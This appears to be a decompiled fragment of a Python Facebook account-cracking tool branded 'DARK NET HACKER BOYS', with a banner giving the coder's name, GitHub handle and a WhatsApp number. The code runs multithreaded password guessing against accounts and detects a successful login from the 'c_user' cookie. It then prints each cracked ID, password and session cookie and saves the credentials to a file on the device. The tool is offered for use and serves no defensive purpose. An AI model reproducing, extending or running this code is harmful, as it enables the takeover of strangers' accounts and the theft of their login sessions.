#  Tools By DARK NET HACKER BOYS 
# Time Succes decompile : 2024-08-24
...
(_))|___|((_)___|((_) ((_)_  ((_)_ ((_|_))   
 ...
 |___/ |_|\_|  |_||_|  |___/\___/ |_| |___/  
     ...
     │ [💸] CODED BY : DNH_ABID              │
     │ [💸] GITHUB   : Dnh-Abid.              │
     │ [💸] WHATSAPP : +8801770164793         │
     │ [💸] VERSION  : UPDATE   2.0          │
     │ [💸] HACKED   : \033[1;32mDARK NET HACKER BOYS \033[1;37m │
     └───────────────────────────────────────┘ """)
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
...
def clear():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/mdmurss.murss?mibextid=ZbWKwL')
    print(logo)
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m DARK-NET-HACKER-BOYS')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[DNH-OK🍁] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/DNH-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}DNH{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
